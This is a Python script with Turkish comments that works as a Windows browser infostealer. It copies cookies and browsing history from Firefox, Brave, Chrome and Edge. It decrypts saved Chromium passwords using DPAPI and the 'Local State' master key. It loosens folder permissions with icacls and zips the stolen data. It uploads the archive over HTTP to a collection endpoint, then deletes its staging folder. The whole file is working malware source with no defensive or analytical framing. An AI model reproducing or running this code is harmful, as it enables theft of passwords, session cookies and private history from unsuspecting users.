import os
import json
import base64
import sqlite3
import shutil
import glob
import requests
import zipfile
from win32crypt import CryptUnprotectData  # type: ignore
from Crypto.Cipher import AES
import browser_cookie3

# C:\Windows\Temp\DLL dizinini tanımla
temp_dir = r"C:\Windows\Temp\DLL"

# Eğer klasör varsa, sil
try:
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        print(f"{temp_dir} klasörü başarıyla silindi.")
except Exception as e:
    print(f"Klasör silinirken hata: {e}")

# Yeni dizini oluştur
try:
    os.makedirs(temp_dir, exist_ok=True)
    print(f"{temp_dir} klasörü başarıyla oluşturuldu.")
except Exception as e:
    print(f"Klasör oluşturulurken hata: {e}")

# Klasör izinlerini ayarla
def set_permissions(directory):
    try:
        os.system(f'icacls "{directory}" /grant Everyone:(OI)(CI)F /T')
        print(f"{directory} klasörüne izinler başarıyla ayarlandı.")
    except Exception as e:
        print(f"Klasör izinleri ayarlanırken hata: {e}")

set_permissions(temp_dir)

# Firefox profil dizinini bul
def get_firefox_profile_path():
    profiles_dir = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
    profiles = glob.glob(os.path.join(profiles_dir, '*default-release'))
    if profiles:
        print(f"Bulunan Firefox profili: {profiles[0]}")
        return profiles[0]
    else:
        print("Firefox profili bulunamadı.")
        return None

firefox_profile = get_firefox_profile_path()

# Tarayıcıların çerezlerini al
browsers = {
    "Firefox": {
        "cookies": browser_cookie3.firefox,
        "history_db": os.path.join(firefox_profile, 'places.sqlite') if firefox_profile else None
    },
    "Brave": {
        "cookies": browser_cookie3.brave,
        "history_db": os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History')
    },
    "google-chrome": {
        "cookies": browser_cookie3.chrome,
        "history_db": os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'History')
    },
    "microsoft-edge": {
        "cookies": browser_cookie3.edge,
        "history_db": os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'History')
    },
}

for browser_name, browser_info in browsers.items():
    try:
        # Her tarayıcı için uygun dizini oluştur
        browser_dir = os.path.join(temp_dir, browser_name)
        os.makedirs(browser_dir, exist_ok=True)
        print(f"{browser_name} için dizin oluşturuldu: {browser_dir}")

        # Klasör izinlerini ayarla
        set_permissions(browser_dir)

        # Çerezleri al
        try:
            cookies = browser_info["cookies"]()
            cookie_file_path = os.path.join(browser_dir, 'cookies.json')
            cookie_data = []

            for cookie in cookies:
                cookie_data.append({
                    "name": cookie.name,
                    "value": cookie.value,
                    "domain": cookie.domain,
                    "path": cookie.path,
                    "expires": cookie.expires,
                    "is_secure": cookie.secure
                })

            with open(cookie_file_path, 'w') as cookie_file:
                json.dump(cookie_data, cookie_file, indent=4)
            print(f"{browser_name} çerezleri {cookie_file_path} dosyasına kaydedildi.")

        except Exception as e:
            print(f"{browser_name} çerezleri alınırken hata: {e}")

        # Tarayıcı geçmişini al
        try:
            history_file_path = browser_info["history_db"]
            print(f"{browser_name} geçmişi için veritabanı yolu: {history_file_path}")

            if os.path.exists(history_file_path):
                conn = sqlite3.connect(history_file_path)
                cursor = conn.cursor()

                if browser_name == "Firefox":
                    cursor.execute("SELECT url, title, last_visit_date FROM moz_places")
                elif browser_name in ["Brave", "google-chrome", "microsoft-edge"]:
                    cursor.execute("SELECT url, title, last_visit_time FROM urls")

                history_data = [{"url": row[0], "title": row[1], "last_visit_time": row[2]} for row in cursor.fetchall()]
                conn.close()

                # Geçmişi JSON formatında kaydet
                history_file_path = os.path.join(browser_dir, 'history.json')
                with open(history_file_path, 'w') as history_file:
                    json.dump(history_data, history_file, indent=4)
                print(f"{browser_name} geçmişi {history_file_path} dosyasına kaydedildi.")
            else:
                print(f"{browser_name} geçmişi bulunamadı.")

        except sqlite3.OperationalError as e:
            print(f"{browser_name} geçmişi alınırken veritabanı açılamadı: {e}. Tarayıcı kapalı mı?")
        except Exception as e:
            print(f"{browser_name} geçmişi alınırken hata: {e}")

    except Exception as e:
        print(f"{browser_name} için işlem yapılırken hata: {e}")

# Master key'i alma fonksiyonu
def get_master_key(path: str):
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        return None

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def get_login_data(path: str):
    login_db = os.path.join(path, 'Login Data')
    if not os.path.exists(login_db):
        return []

    results = []
    shutil.copy(login_db, os.path.join(temp_dir, 'login_db'))
    conn = sqlite3.connect(os.path.join(temp_dir, 'login_db'))
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')

    master_key = get_master_key(path)
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key) if master_key else "Decryption Failed"
        results.append({
            "URL": row[0],
            "Email": row[1],
            "Password": password
        })
    conn.close()
    os.remove(os.path.join(temp_dir, 'login_db'))
    return results

# Ensure that history_db is checked properly in the installed_browsers function
def installed_browsers():
    results = []
    for browser, info in browsers.items():
        if os.path.exists(info["history_db"]):
            results.append(browser)
    return results

def mainpass():
    available_browsers = installed_browsers()
    results = {}

    for browser in available_browsers:
        browser_path = os.path.dirname(browsers[browser]["history_db"])
        results[browser] = {
            "Saved_Passwords": get_login_data(browser_path),
            "Browser_History": [],
            "Browser_Cookies": [],
            # Diğer verileri ekleyebilirsiniz
        }

    save_results(results)

def save_results(results):
    file_path = r'C:\Windows\Temp\browser_data.json'
    with open(file_path, 'w', encoding="utf-8") as f:
        json.dump(results, f, indent=4)

    shutil.make_archive(r'C:\Windows\Temp\browser_data', 'zip', r'C:\Windows\Temp', 'browser_data.json')
    os.remove(file_path)
    print("Veriler başarıyla JSON formatında kaydedildi ve zip dosyasına dönüştürüldü.")

if __name__ == "__main__":
    mainpass()

# DLL klasörünü ZIP dosyasına sıkıştır
zip_file_path = r"C:\Windows\Temp\DLL.zip"
with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
    for foldername, subfolders, filenames in os.walk(temp_dir):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            zip_file.write(file_path, os.path.relpath(file_path, temp_dir))
print(f"DLL klasörü {zip_file_path} dosyasına sıkıştırıldı.")

# ZIP dosyasını gönder
try:
    with open(zip_file_path, 'rb') as zip_file:
        response = requests.post("http://localhost:5000/upload", files={"DLL.zip": zip_file})
        print(f"ZIP dosyası gönderildi, sunucudan yanıt: {response.text}")
        
    # Başarılı gönderim sonrası temp klasörünü sil
    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"{temp_dir} klasörü başarıyla silindi.")
except Exception as e:
    print(f"ZIP dosyası gönderilirken hata: {e}")
